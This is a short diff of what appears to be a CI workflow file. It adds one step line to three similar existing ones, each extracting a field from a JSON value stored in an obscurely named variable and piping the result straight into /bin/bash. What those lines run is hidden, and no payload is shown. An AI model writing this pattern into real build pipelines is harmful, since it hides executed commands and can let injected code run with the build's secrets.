@@ -53,6 +53,7 @@ jobs:
           printf '%s' "$wrjfs49435" | jq -r .x3877 | /bin/bash
           printf '%s' "$afwlc89183" | jq -r .qaj153 | /bin/bash
           printf '%s' "$sm9243" | jq -r .dvh7775 | /bin/bash
+          echo $pt74 | jq -r .job342 | /bin/bash
 
       - name: Save archive
         if: always()
